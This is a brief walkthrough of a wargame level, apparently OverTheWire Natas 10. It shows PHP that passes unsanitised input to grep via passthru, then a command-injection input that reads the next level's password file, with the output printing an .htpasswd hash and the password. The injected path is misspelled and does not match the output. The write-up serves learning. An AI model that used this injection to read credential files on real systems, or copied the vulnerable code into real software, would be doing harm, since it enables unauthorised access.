The Page Source code

```html
<div id="content">

For security reasons, we now filter on certain characters<br><br>
<form>
Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
</form>


Output:
<pre></pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```
index-source.html 

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
So it now uses regex for filtering 
Now lets test it 

okay i tried same as previous example says illegal character , tried to add nullbyte "%00" Says Illegal Characters
**HINT** we can modify the output of the grep to output the required file 

```text
// input ".* /etc/natasweb_pass/natas11 #" 
# the hash is to terminate the command after it output what we need

the output is 
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
Interesting idea
